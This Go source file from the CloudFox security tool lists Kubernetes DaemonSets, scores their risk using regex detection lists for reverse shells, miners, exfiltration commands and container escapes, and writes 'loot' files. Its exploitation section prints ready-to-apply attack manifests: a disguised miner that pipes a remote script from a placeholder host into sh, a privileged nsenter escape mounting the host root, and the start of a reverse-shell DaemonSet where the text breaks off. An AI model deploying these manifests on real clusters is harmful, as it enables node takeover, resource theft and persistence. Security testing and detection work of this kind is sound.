package commands

import (
	"context"
	"fmt"
	"regexp"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
)

var DaemonSetsCmd = &cobra.Command{
	Use:     "daemonsets",
	Aliases: []string{"ds"},
	Short:   "List all cluster DaemonSets",
	Long: `
List all cluster DaemonSets (controller-level and template-level information):
  cloudfox kubernetes daemonsets`,
	Run: ListDaemonSets,
}

type DaemonSetsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t DaemonSetsOutput) TableFiles() []internal.TableFile { return t.Table }
func (t DaemonSetsOutput) LootFiles() []internal.LootFile   { return t.Loot }

type DaemonSetFinding struct {
	Namespace              string
	Name                   string
	RiskLevel              string
	RiskScore              int
	SecurityIssues         []string
	BackdoorPatterns       []string
	ReverseShells          []string
	CryptoMiners           []string
	DataExfiltration       []string
	ContainerEscape        []string
	NodeCompromise         []string
	DesiredNodes           int32
	CurrentNodes           int32
	ReadyNodes             int32
	ServiceAccount         string
	Containers             []string
	ImageRegistry          string
	ImageTags              []string
	HostPID                bool
	HostIPC                bool
	HostNetwork            bool
	Privileged             bool
	HostPaths              []string
	Volumes                []string
	RunAsUser              string
	Capabilities           []string
	NodeSelector           map[string]string
	Tolerations            []string
	Labels                 map[string]string
	Annotations            map[string]string
	CloudProvider          string
	CloudRole              string
	Commands               []string
	Args                   []string
	EnvVars                []string
	CreationTimestamp      string
}

func ListDaemonSets(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating daemonsets for %s", globals.ClusterName), globals.K8S_DAEMONSETS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	daemonSets, err := clientset.AppsV1().DaemonSets("").List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing DaemonSets: %v", err), globals.K8S_DAEMONSETS_MODULE_NAME)
		return
	}

	headers := []string{
		"Risk Level", "Namespace", "Name", "Nodes (Desired/Current/Ready)",
		"Backdoor Patterns", "Node Compromise", "Reverse Shells", "Crypto Miners",
		"Data Exfiltration", "Container Escape",
		"Service Account", "Containers", "Volumes",
		"HostPID", "HostIPC", "HostNetwork", "Privileged", "HostPaths", "Capabilities",
		"Cloud Provider", "Cloud Role",
	}

	var outputRows [][]string
	var findings []DaemonSetFinding

	// Risk counters
	var criticalCount, highCount, mediumCount, lowCount int

	for _, ds := range daemonSets.Items {
		spec := ds.Spec.Template.Spec

		// Run comprehensive security analysis
		finding := analyzeDaemonSetSecurity(
			ctx,
			clientset,
			ds.Namespace,
			ds.Name,
			ds.Status.DesiredNumberScheduled,
			ds.Status.CurrentNumberScheduled,
			ds.Status.NumberReady,
			spec,
			spec.NodeSelector,
			ds.Spec.Template.Annotations,
		)

		findings = append(findings, finding)

		// Count risk levels
		switch finding.RiskLevel {
		case "CRITICAL":
			criticalCount++
		case "HIGH":
			highCount++
		case "MEDIUM":
			mediumCount++
		case "LOW":
			lowCount++
		}

		// Format findings for table
		backdoorPatternsStr := strings.Join(finding.BackdoorPatterns, "; ")
		nodeCompromiseStr := strings.Join(finding.NodeCompromise, "; ")
		reverseShellsStr := strings.Join(finding.ReverseShells, "; ")
		cryptoMinersStr := strings.Join(finding.CryptoMiners, "; ")
		dataExfilStr := strings.Join(finding.DataExfiltration, "; ")
		containerEscapeStr := strings.Join(finding.ContainerEscape, "; ")
		containersStr := strings.Join(finding.Containers, ", ")
		volumesStr := strings.Join(finding.Volumes, ", ")
		hostPathsStr := strings.Join(finding.HostPaths, "; ")
		capsStr := strings.Join(finding.Capabilities, ", ")

		nodeStats := fmt.Sprintf("%d/%d/%d", finding.DesiredNodes, finding.CurrentNodes, finding.ReadyNodes)

		row := []string{
			finding.RiskLevel,
			finding.Namespace,
			finding.Name,
			nodeStats,
			k8sinternal.NonEmpty(backdoorPatternsStr),
			k8sinternal.NonEmpty(nodeCompromiseStr),
			k8sinternal.NonEmpty(reverseShellsStr),
			k8sinternal.NonEmpty(cryptoMinersStr),
			k8sinternal.NonEmpty(dataExfilStr),
			k8sinternal.NonEmpty(containerEscapeStr),
			k8sinternal.NonEmpty(finding.ServiceAccount),
			k8sinternal.NonEmpty(containersStr),
			k8sinternal.NonEmpty(volumesStr),
			k8sinternal.SafeBool(finding.HostPID),
			k8sinternal.SafeBool(finding.HostIPC),
			k8sinternal.SafeBool(finding.HostNetwork),
			fmt.Sprintf("%v", finding.Privileged),
			k8sinternal.NonEmpty(hostPathsStr),
			k8sinternal.NonEmpty(capsStr),
			k8sinternal.NonEmpty(finding.CloudProvider),
			k8sinternal.NonEmpty(finding.CloudRole),
		}
		outputRows = append(outputRows, row)
	}

	// Generate comprehensive loot files
	lootFiles := generateDaemonSetLoot(findings, globals.KubeContext)

	table := internal.TableFile{Name: "DaemonSets", Header: headers, Body: outputRows}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"DaemonSets",
		globals.ClusterName,
		"results",
		DaemonSetsOutput{Table: []internal.TableFile{table}, Loot: lootFiles},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_DAEMONSETS_MODULE_NAME)
		return
	}

	if len(outputRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d daemonsets found", len(outputRows)), globals.K8S_DAEMONSETS_MODULE_NAME)
		logger.InfoM(fmt.Sprintf("Risk Summary: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
			criticalCount, highCount, mediumCount, lowCount), globals.K8S_DAEMONSETS_MODULE_NAME)

		if criticalCount > 0 {
			logger.InfoM(fmt.Sprintf("⚠️  %d CRITICAL risk daemonsets detected! Check DaemonSet-Node-Compromise loot file", criticalCount), globals.K8S_DAEMONSETS_MODULE_NAME)
		}
		if highCount > 0 {
			logger.InfoM(fmt.Sprintf("⚠️  %d HIGH risk daemonsets detected! Check DaemonSet-Node-Compromise loot file", highCount), globals.K8S_DAEMONSETS_MODULE_NAME)
		}
	} else {
		logger.InfoM("No daemonsets found, skipping output file creation", globals.K8S_DAEMONSETS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_DAEMONSETS_MODULE_NAME), globals.K8S_DAEMONSETS_MODULE_NAME)
}

// --- Security Analysis Functions ---

func detectDSReverseShells(commands []string, args []string) []string {
	var findings []string
	patterns := []struct {
		regex *regexp.Regexp
		desc  string
	}{
		{regexp.MustCompile(`bash\s+-i\s+>&\s+/dev/tcp/`), "Bash TCP reverse shell"},
		{regexp.MustCompile(`bash\s+-i\s+>&\s+/dev/udp/`), "Bash UDP reverse shell"},
		{regexp.MustCompile(`nc\s+-e\s+/bin/(bash|sh)`), "Netcat reverse shell"},
		{regexp.MustCompile(`nc\s+.*\s+-e\s+/bin/(bash|sh)`), "Netcat reverse shell with options"},
		{regexp.MustCompile(`mkfifo\s+/tmp/[a-z];.*nc\s+`), "Named pipe reverse shell"},
		{regexp.MustCompile(`python.*socket.*subprocess`), "Python reverse shell"},
		{regexp.MustCompile(`perl.*socket.*open\(STDIN`), "Perl reverse shell"},
		{regexp.MustCompile(`ruby.*socket.*exec`), "Ruby reverse shell"},
		{regexp.MustCompile(`php.*fsockopen.*exec`), "PHP reverse shell"},
		{regexp.MustCompile(`socat.*exec:.*pty`), "Socat reverse shell"},
		{regexp.MustCompile(`ncat.*--sh-exec`), "Ncat reverse shell"},
		{regexp.MustCompile(`telnet.*\|.*bin/(bash|sh)`), "Telnet reverse shell"},
	}

	allText := strings.Join(append(commands, args...), " ")
	for _, p := range patterns {
		if p.regex.MatchString(allText) {
			findings = append(findings, p.desc)
		}
	}
	return findings
}

func detectDSCryptoMiners(commands []string, args []string, images []string) []string {
	var findings []string
	patterns := []struct {
		regex *regexp.Regexp
		desc  string
	}{
		{regexp.MustCompile(`(?i)xmrig`), "XMRig crypto miner"},
		{regexp.MustCompile(`(?i)minerd`), "CPU miner (minerd)"},
		{regexp.MustCompile(`(?i)cpuminer`), "CPU miner"},
		{regexp.MustCompile(`(?i)stratum\+tcp://`), "Stratum mining pool connection"},
		{regexp.MustCompile(`(?i)--donate-level`), "Miner donation level flag"},
		{regexp.MustCompile(`(?i)--coin=monero`), "Monero mining"},
		{regexp.MustCompile(`(?i)--coin=ethereum`), "Ethereum mining"},
		{regexp.MustCompile(`(?i)--algo=cryptonight`), "CryptoNight algorithm mining"},
		{regexp.MustCompile(`(?i)ethminer`), "Ethereum miner"},
		{regexp.MustCompile(`(?i)claymore`), "Claymore miner"},
		{regexp.MustCompile(`(?i)phoenixminer`), "PhoenixMiner"},
		{regexp.MustCompile(`(?i)t-rex`), "T-Rex miner"},
		{regexp.MustCompile(`(?i)--pool=`), "Mining pool configuration"},
		{regexp.MustCompile(`(?i)--wallet=`), "Crypto wallet address"},
		{regexp.MustCompile(`(?i)--user=.*\.(worker|miner)`), "Mining worker configuration"},
	}

	allText := strings.Join(append(append(commands, args...), images...), " ")
	for _, p := range patterns {
		if p.regex.MatchString(allText) {
			findings = append(findings, p.desc)
		}
	}
	return findings
}

func detectDSDataExfiltration(commands []string, args []string) []string {
	var findings []string
	patterns := []struct {
		regex *regexp.Regexp
		desc  string
	}{
		{regexp.MustCompile(`curl.*http.*\|.*bash`), "Curl pipe to bash (backdoor download)"},
		{regexp.MustCompile(`wget.*http.*\|.*bash`), "Wget pipe to bash (backdoor download)"},
		{regexp.MustCompile(`curl.*-X\s+POST.*--data`), "HTTP POST with data (exfiltration)"},
		{regexp.MustCompile(`base64.*\|.*curl`), "Base64 encode and curl (data exfiltration)"},
		{regexp.MustCompile(`tar.*\|.*curl.*-T`), "Tar and upload via curl"},
		{regexp.MustCompile(`aws\s+s3\s+cp.*s3://(?!internal)`), "AWS S3 copy to external bucket"},
		{regexp.MustCompile(`gsutil\s+cp.*gs://`), "GCP Cloud Storage upload"},
		{regexp.MustCompile(`kubectl\s+cp.*:.*\.`), "kubectl cp from pod (data extraction)"},
		{regexp.MustCompile(`scp.*@.*:`), "SCP file transfer"},
		{regexp.MustCompile(`rsync.*@.*:`), "Rsync file transfer"},
		{regexp.MustCompile(`nc.*>.*\.(zip|tar|gz|tgz)`), "Netcat file transfer"},
		{regexp.MustCompile(`find\s+/.*-name.*\|.*curl`), "Find files and exfiltrate"},
		{regexp.MustCompile(`cat\s+/etc/shadow.*\|`), "Shadow file access and pipe"},
		{regexp.MustCompile(`cat\s+/etc/passwd.*\|`), "Passwd file access and pipe"},
		{regexp.MustCompile(`env.*\|.*curl`), "Environment variable exfiltration"},
	}

	allText := strings.Join(append(commands, args...), " ")
	for _, p := range patterns {
		if p.regex.MatchString(allText) {
			findings = append(findings, p.desc)
		}
	}
	return findings
}

func detectDSContainerEscape(commands []string, args []string, hostPaths []string) []string {
	var findings []string
	patterns := []struct {
		regex *regexp.Regexp
		desc  string
	}{
		{regexp.MustCompile(`nsenter\s+--target\s+1`), "nsenter escape to host PID namespace"},
		{regexp.MustCompile(`nsenter.*--mount.*--uts.*--ipc.*--net.*--pid`), "nsenter full namespace escape"},
		{regexp.MustCompile(`docker\.sock`), "Docker socket access (container escape)"},
		{regexp.MustCompile(`containerd\.sock`), "Containerd socket access (container escape)"},
		{regexp.MustCompile(`crio\.sock`), "CRI-O socket access (container escape)"},
		{regexp.MustCompile(`runc`), "runc binary (potential container escape)"},
		{regexp.MustCompile(`ctr\s+`), "containerd CLI (container runtime access)"},
		{regexp.MustCompile(`crictl`), "CRI CLI (container runtime access)"},
		{regexp.MustCompile(`mount.*proc.*sys`), "Proc/sys mount (escape technique)"},
		{regexp.MustCompile(`unshare`), "unshare namespace manipulation"},
	}

	allText := strings.Join(append(commands, args...), " ")
	for _, p := range patterns {
		if p.regex.MatchString(allText) {
			findings = append(findings, p.desc)
		}
	}

	// Check hostPath mounts for critical escape vectors
	for _, hp := range hostPaths {
		if strings.Contains(hp, "docker.sock") {
			findings = append(findings, "HostPath: docker.sock mounted (CRITICAL escape)")
		}
		if strings.Contains(hp, "containerd.sock") {
			findings = append(findings, "HostPath: containerd.sock mounted (CRITICAL escape)")
		}
		if strings.Contains(hp, "/var/run") {
			findings = append(findings, "HostPath: /var/run mounted (socket access)")
		}
		if hp == "/" || hp == "/host" || strings.HasPrefix(hp, "/:") {
			findings = append(findings, "HostPath: root filesystem mounted (CRITICAL escape)")
		}
	}

	return findings
}

// detectNodeCompromise checks for DaemonSet-specific node compromise indicators
func detectNodeCompromise(hostPaths []string, capabilities []string, hostPID, hostIPC, hostNetwork, privileged bool) []string {
	var findings []string

	// DaemonSets with these combinations are designed for node compromise
	if privileged && hostPID {
		findings = append(findings, "Privileged + HostPID: Can access all node processes")
	}

	if privileged && len(hostPaths) > 0 {
		findings = append(findings, "Privileged + HostPaths: Can modify node filesystem")
	}

	if hostNetwork && hostPID {
		findings = append(findings, "HostNetwork + HostPID: Full node network visibility")
	}

	// Check for dangerous capabilities
	dangerousCaps := []string{"SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE", "DAC_OVERRIDE", "DAC_READ_SEARCH"}
	for _, cap := range capabilities {
		for _, danger := range dangerousCaps {
			if strings.Contains(cap, danger) {
				findings = append(findings, fmt.Sprintf("Dangerous capability: %s", danger))
			}
		}
	}

	// Check for specific hostPath targets
	for _, hp := range hostPaths {
		// Extract just the path part (before colon if mount point included)
		path := strings.Split(hp, ":")[0]

		if strings.Contains(path, "/var/lib/kubelet") {
			findings = append(findings, "HostPath: /var/lib/kubelet (access to all pod secrets)")
		}
		if strings.Contains(path, "/etc/kubernetes") {
			findings = append(findings, "HostPath: /etc/kubernetes (cluster configuration)")
		}
		if strings.Contains(path, "/var/log") {
			findings = append(findings, "HostPath: /var/log (node log access)")
		}
		if strings.Contains(path, "/proc") {
			findings = append(findings, "HostPath: /proc (process information)")
		}
		if strings.Contains(path, "/sys") {
			findings = append(findings, "HostPath: /sys (kernel parameters)")
		}
		if strings.Contains(path, "/dev") {
			findings = append(findings, "HostPath: /dev (device access)")
		}
	}

	return findings
}

func analyzeDaemonSetSecurity(
	ctx context.Context,
	clientset *kubernetes.Clientset,
	namespace string,
	name string,
	desiredNodes int32,
	currentNodes int32,
	readyNodes int32,
	podSpec v1.PodSpec,
	nodeSelector map[string]string,
	annotations map[string]string,
) DaemonSetFinding {

	finding := DaemonSetFinding{
		Namespace:     namespace,
		Name:          name,
		DesiredNodes:  desiredNodes,
		CurrentNodes:  currentNodes,
		ReadyNodes:    readyNodes,
		ServiceAccount: podSpec.ServiceAccountName,
		HostPID:       podSpec.HostPID,
		HostIPC:       podSpec.HostIPC,
		HostNetwork:   podSpec.HostNetwork,
		NodeSelector:  nodeSelector,
		Annotations:   annotations,
	}

	// Extract containers, commands, args, images
	var containers []string
	var allCommands []string
	var allArgs []string
	var allImages []string
	var allEnvVars []string
	var capabilities []string
	privileged := false
	runAsUser := "<NONE>"

	for _, c := range podSpec.Containers {
		containers = append(containers, fmt.Sprintf("%s:%s", c.Name, c.Image))
		allImages = append(allImages, c.Image)
		allCommands = append(allCommands, c.Command...)
		allArgs = append(allArgs, c.Args...)

		// Security context
		if c.SecurityContext != nil {
			if c.SecurityContext.Privileged != nil && *c.SecurityContext.Privileged {
				privileged = true
			}
			if c.SecurityContext.RunAsUser != nil {
				runAsUser = fmt.Sprintf("%d", *c.SecurityContext.RunAsUser)
			}
			if c.SecurityContext.Capabilities != nil {
				for _, cap := range c.SecurityContext.Capabilities.Add {
					capabilities = append(capabilities, string(cap))
				}
			}
		}

		// Collect environment variables
		for _, env := range c.Env {
			if env.Value != "" {
				allEnvVars = append(allEnvVars, fmt.Sprintf("%s=%s", env.Name, env.Value))
			}
		}
	}

	finding.Containers = containers
	finding.Commands = allCommands
	finding.Args = allArgs
	finding.Privileged = privileged
	finding.RunAsUser = runAsUser
	finding.Capabilities = capabilities
	finding.EnvVars = allEnvVars

	// Extract image registry and tags
	if len(allImages) > 0 {
		img := allImages[0]
		if strings.Contains(img, "/") {
			parts := strings.Split(img, "/")
			finding.ImageRegistry = parts[0]
		}

		for _, img := range allImages {
			if strings.Contains(img, ":") {
				tag := strings.Split(img, ":")[1]
				finding.ImageTags = append(finding.ImageTags, tag)
			}
		}
	}

	// Extract volumes and hostPaths
	var volumes []string
	var hostPaths []string
	for _, v := range podSpec.Volumes {
		volumes = append(volumes, v.Name)
		if v.HostPath != nil {
			mountPoint := k8sinternal.FindMountPath(v.Name, podSpec.Containers)
			hostPaths = append(hostPaths, fmt.Sprintf("%s:%s", v.HostPath.Path, mountPoint))
		}
	}
	finding.Volumes = volumes
	finding.HostPaths = hostPaths

	// Cloud role detection
	if podSpec.ServiceAccountName != "" {
		roleResults := k8sinternal.DetectCloudRole(
			ctx,
			clientset,
			namespace,
			podSpec.ServiceAccountName,
			&podSpec,
			annotations,
		)
		if len(roleResults) > 0 {
			finding.CloudProvider = roleResults[0].Provider
			finding.CloudRole = roleResults[0].Role
		}
	}

	// Run security detection
	finding.ReverseShells = detectDSReverseShells(allCommands, allArgs)
	finding.CryptoMiners = detectDSCryptoMiners(allCommands, allArgs, allImages)
	finding.DataExfiltration = detectDSDataExfiltration(allCommands, allArgs)
	finding.ContainerEscape = detectDSContainerEscape(allCommands, allArgs, hostPaths)
	finding.NodeCompromise = detectNodeCompromise(hostPaths, capabilities, podSpec.HostPID, podSpec.HostIPC, podSpec.HostNetwork, privileged)

	// Combine all backdoor patterns
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.ReverseShells...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.CryptoMiners...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.DataExfiltration...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.ContainerEscape...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.NodeCompromise...)

	// Calculate risk level
	finding.RiskLevel = calculateDaemonSetRiskLevel(finding)

	// Calculate risk score (0-100)
	finding.RiskScore = calculateDaemonSetRiskScore(finding)

	// Generate security issues
	finding.SecurityIssues = generateDaemonSetSecurityIssues(finding)

	return finding
}

func calculateDaemonSetRiskLevel(finding DaemonSetFinding) string {
	// CRITICAL: Active backdoors, reverse shells, crypto miners
	if len(finding.ReverseShells) > 0 {
		return "CRITICAL"
	}
	if len(finding.CryptoMiners) > 0 {
		return "CRITICAL"
	}
	// DaemonSets running on ALL nodes with container escape = cluster-wide compromise
	if len(finding.ContainerEscape) > 0 && finding.DesiredNodes > 5 {
		return "CRITICAL"
	}
	// Privileged DaemonSet with hostPath to root or runtime sockets
	if finding.Privileged && len(finding.HostPaths) > 0 {
		for _, hp := range finding.HostPaths {
			if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") ||
			   hp == "/" || hp == "/:" || strings.HasPrefix(hp, "/:") {
				return "CRITICAL"
			}
		}
	}

	// HIGH: Data exfiltration, node compromise indicators, privileged + host access
	if len(finding.DataExfiltration) > 0 {
		return "HIGH"
	}
	if len(finding.NodeCompromise) >= 3 {
		return "HIGH"
	}
	if len(finding.ContainerEscape) > 0 {
		return "HIGH"
	}
	if finding.Privileged && (finding.HostPID || finding.HostIPC) {
		return "HIGH"
	}
	// DaemonSets with dangerous capabilities
	for _, cap := range finding.Capabilities {
		if strings.Contains(cap, "SYS_ADMIN") || strings.Contains(cap, "SYS_MODULE") {
			return "HIGH"
		}
	}

	// MEDIUM: HostNetwork, some node compromise, cloud roles
	if finding.HostNetwork {
		return "MEDIUM"
	}
	if len(finding.NodeCompromise) > 0 {
		return "MEDIUM"
	}
	if finding.CloudRole != "" && finding.CloudRole != "<NONE>" {
		return "MEDIUM"
	}
	if finding.Privileged {
		return "MEDIUM"
	}
	if finding.HostPID || finding.HostIPC {
		return "MEDIUM"
	}

	// LOW: Standard daemonset
	return "LOW"
}

func generateDaemonSetLoot(findings []DaemonSetFinding, kubeContext string) []internal.LootFile {
	var lootFiles []internal.LootFile

	// Separate findings by risk level
	var critical, high, medium, low []DaemonSetFinding
	for _, f := range findings {
		switch f.RiskLevel {
		case "CRITICAL":
			critical = append(critical, f)
		case "HIGH":
			high = append(high, f)
		case "MEDIUM":
			medium = append(medium, f)
		case "LOW":
			low = append(low, f)
		}
	}

	// Sort each group by namespace, then name
	sortFindings := func(findings []DaemonSetFinding) {
		sort.Slice(findings, func(i, j int) bool {
			if findings[i].Namespace != findings[j].Namespace {
				return findings[i].Namespace < findings[j].Namespace
			}
			return findings[i].Name < findings[j].Name
		})
	}
	sortFindings(critical)
	sortFindings(high)
	sortFindings(medium)
	sortFindings(low)

	// 1. DaemonSet-Enum: Basic enumeration commands
	var enumLines []string
	enumLines = append(enumLines, "########################################")
	enumLines = append(enumLines, "##### DaemonSet Enumeration Commands")
	enumLines = append(enumLines, "########################################\n")
	if kubeContext != "" {
		enumLines = append(enumLines, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
	}
	enumLines = append(enumLines, "# List all daemonsets across all namespaces")
	enumLines = append(enumLines, "kubectl get daemonsets -A\n")
	enumLines = append(enumLines, "# Get detailed information for all daemonsets")
	enumLines = append(enumLines, "kubectl get daemonsets -A -o wide\n")

	for _, f := range findings {
		enumLines = append(enumLines, fmt.Sprintf("\n# Namespace: %s | DaemonSet: %s | Risk: %s | Nodes: %d", f.Namespace, f.Name, f.RiskLevel, f.DesiredNodes))
		enumLines = append(enumLines, fmt.Sprintf("kubectl get daemonset -n %s %s -o yaml", f.Namespace, f.Name))
		enumLines = append(enumLines, fmt.Sprintf("kubectl describe daemonset -n %s %s", f.Namespace, f.Name))

		// Add pod listing
		enumLines = append(enumLines, fmt.Sprintf("# List pods created by this daemonset"))
		enumLines = append(enumLines, fmt.Sprintf("kubectl get pods -n %s -l app=%s", f.Namespace, f.Name))
	}

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "DaemonSet-Enum",
		Contents: strings.Join(enumLines, "\n"),
	})

	// 2. DaemonSet-Node-Compromise: High-risk findings with node compromise analysis
	var compromiseLines []string
	compromiseLines = append(compromiseLines, "########################################")
	compromiseLines = append(compromiseLines, "##### DaemonSet Node Compromise Analysis")
	compromiseLines = append(compromiseLines, "########################################\n")
	compromiseLines = append(compromiseLines, fmt.Sprintf("# CRITICAL Risk: %d daemonsets", len(critical)))
	compromiseLines = append(compromiseLines, fmt.Sprintf("# HIGH Risk: %d daemonsets", len(high)))
	compromiseLines = append(compromiseLines, fmt.Sprintf("# MEDIUM Risk: %d daemonsets\n", len(medium)))

	if len(critical) > 0 {
		compromiseLines = append(compromiseLines, "\n=== CRITICAL RISK DAEMONSETS ===\n")
		for _, f := range critical {
			compromiseLines = append(compromiseLines, fmt.Sprintf("Namespace: %s", f.Namespace))
			compromiseLines = append(compromiseLines, fmt.Sprintf("Name: %s", f.Name))
			compromiseLines = append(compromiseLines, fmt.Sprintf("Nodes Affected: %d (Desired: %d, Ready: %d)", f.CurrentNodes, f.DesiredNodes, f.ReadyNodes))

			if len(f.BackdoorPatterns) > 0 {
				compromiseLines = append(compromiseLines, "\nTHREAT PATTERNS DETECTED:")
				for _, bp := range f.BackdoorPatterns {
					compromiseLines = append(compromiseLines, fmt.Sprintf("  - %s", bp))
				}
			}

			if len(f.NodeCompromise) > 0 {
				compromiseLines = append(compromiseLines, "\nNODE COMPROMISE VECTORS:")
				for _, nc := range f.NodeCompromise {
					compromiseLines = append(compromiseLines, fmt.Sprintf("  - %s", nc))
				}
			}

			compromiseLines = append(compromiseLines, fmt.Sprintf("\nContainers: %s", strings.Join(f.Containers, ", ")))
			compromiseLines = append(compromiseLines, fmt.Sprintf("HostPID: %v | HostIPC: %v | HostNetwork: %v | Privileged: %v",
				f.HostPID, f.HostIPC, f.HostNetwork, f.Privileged))

			if len(f.HostPaths) > 0 {
				compromiseLines = append(compromiseLines, fmt.Sprintf("HostPaths: %s", strings.Join(f.HostPaths, ", ")))
			}

			if len(f.Capabilities) > 0 {
				compromiseLines = append(compromiseLines, fmt.Sprintf("Capabilities: %s", strings.Join(f.Capabilities, ", ")))
			}

			compromiseLines = append(compromiseLines, "\n---")
		}
	}

	if len(high) > 0 {
		compromiseLines = append(compromiseLines, "\n=== HIGH RISK DAEMONSETS ===\n")
		for _, f := range high {
			compromiseLines = append(compromiseLines, fmt.Sprintf("%s/%s - %d nodes affected", f.Namespace, f.Name, f.CurrentNodes))
			if len(f.BackdoorPatterns) > 0 {
				compromiseLines = append(compromiseLines, fmt.Sprintf("  Threats: %s", strings.Join(f.BackdoorPatterns, ", ")))
			}
			compromiseLines = append(compromiseLines, "")
		}
	}

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "DaemonSet-Node-Compromise",
		Contents: strings.Join(compromiseLines, "\n"),
	})

	// 3. DaemonSet-Exploitation: Exploitation techniques
	var exploitLines []string
	exploitLines = append(exploitLines, "########################################")
	exploitLines = append(exploitLines, "##### DaemonSet Exploitation Techniques")
	exploitLines = append(exploitLines, "########################################\n")

	exploitLines = append(exploitLines, "=== CLUSTER-WIDE COMPROMISE ===\n")
	exploitLines = append(exploitLines, "# DaemonSets run on EVERY node - perfect for cluster-wide attacks\n")

	exploitLines = append(exploitLines, "# 1. Deploy malicious DaemonSet for cluster-wide crypto mining")
	exploitLines = append(exploitLines, "cat <<EOF | kubectl apply -f -")
	exploitLines = append(exploitLines, "apiVersion: apps/v1")
	exploitLines = append(exploitLines, "kind: DaemonSet")
	exploitLines = append(exploitLines, "metadata:")
	exploitLines = append(exploitLines, "  name: system-monitor")
	exploitLines = append(exploitLines, "  namespace: kube-system")
	exploitLines = append(exploitLines, "spec:")
	exploitLines = append(exploitLines, "  selector:")
	exploitLines = append(exploitLines, "    matchLabels:")
	exploitLines = append(exploitLines, "      name: system-monitor")
	exploitLines = append(exploitLines, "  template:")
	exploitLines = append(exploitLines, "    metadata:")
	exploitLines = append(exploitLines, "      labels:")
	exploitLines = append(exploitLines, "        name: system-monitor")
	exploitLines = append(exploitLines, "    spec:")
	exploitLines = append(exploitLines, "      hostNetwork: true")
	exploitLines = append(exploitLines, "      containers:")
	exploitLines = append(exploitLines, "      - name: miner")
	exploitLines = append(exploitLines, "        image: alpine:latest")
	exploitLines = append(exploitLines, "        command: [\"/bin/sh\", \"-c\"]")
	exploitLines = append(exploitLines, "        args: [\"wget -O - http://POOL/xmrig.sh | sh\"]")
	exploitLines = append(exploitLines, "        resources:")
	exploitLines = append(exploitLines, "          requests:")
	exploitLines = append(exploitLines, "            cpu: 100m")
	exploitLines = append(exploitLines, "            memory: 128Mi")
	exploitLines = append(exploitLines, "EOF\n")

	exploitLines = append(exploitLines, "# 2. Privileged DaemonSet for node escape on ALL nodes")
	exploitLines = append(exploitLines, "cat <<EOF | kubectl apply -f -")
	exploitLines = append(exploitLines, "apiVersion: apps/v1")
	exploitLines = append(exploitLines, "kind: DaemonSet")
	exploitLines = append(exploitLines, "metadata:")
	exploitLines = append(exploitLines, "  name: node-debug")
	exploitLines = append(exploitLines, "  namespace: kube-system")
	exploitLines = append(exploitLines, "spec:")
	exploitLines = append(exploitLines, "  selector:")
	exploitLines = append(exploitLines, "    matchLabels:")
	exploitLines = append(exploitLines, "      name: node-debug")
	exploitLines = append(exploitLines, "  template:")
	exploitLines = append(exploitLines, "    metadata:")
	exploitLines = append(exploitLines, "      labels:")
	exploitLines = append(exploitLines, "        name: node-debug")
	exploitLines = append(exploitLines, "    spec:")
	exploitLines = append(exploitLines, "      hostPID: true")
	exploitLines = append(exploitLines, "      hostNetwork: true")
	exploitLines = append(exploitLines, "      containers:")
	exploitLines = append(exploitLines, "      - name: debug")
	exploitLines = append(exploitLines, "        image: alpine:latest")
	exploitLines = append(exploitLines, "        securityContext:")
	exploitLines = append(exploitLines, "          privileged: true")
	exploitLines = append(exploitLines, "        command: [\"nsenter\", \"--target\", \"1\", \"--mount\", \"--uts\", \"--ipc\", \"--net\", \"--pid\", \"--\", \"/bin/sh\", \"-c\", \"while true; do sleep 3600; done\"]")
	exploitLines = append(exploitLines, "        volumeMounts:")
	exploitLines = append(exploitLines, "        - name: host")
	exploitLines = append(exploitLines, "          mountPath: /host")
	exploitLines = append(exploitLines, "      volumes:")
	exploitLines = append(exploitLines, "      - name: host")
	exploitLines = append(exploitLines, "        hostPath:")
	exploitLines = append(exploitLines, "          path: /")
	exploitLines = append(exploitLines, "EOF\n")

	exploitLines = append(exploitLines, "\n=== NODE-LEVEL BACKDOOR ===\n")
	exploitLines = append(exploitLines, "# 3. DaemonSet with reverse shell to every node")
	exploitLines = append(exploitLines, "cat <<EOF | kubectl apply -f -")
	exploitLines = append(exploitLines, "apiVersion: apps/v1")
	exploitLines = append(exploitLines, "kind: DaemonSet")
	exploitLines = append(exploitLines, "metadata:")
	exploitLines = append(exploitLines, "  name: log-collector")
	exploitLines = append(exploitLines, "  namespace: default")
	exploitLines = append(exploitLines, "spec:")
	exploitLines = append(exploitLines, "  selector:")
	exploitLines = append(exploitLines, "    matchLabels:")
	exploitLines = append(exploitLines, "      name: log-collector")
	exploitLines = append(exploitLines, "  template:")
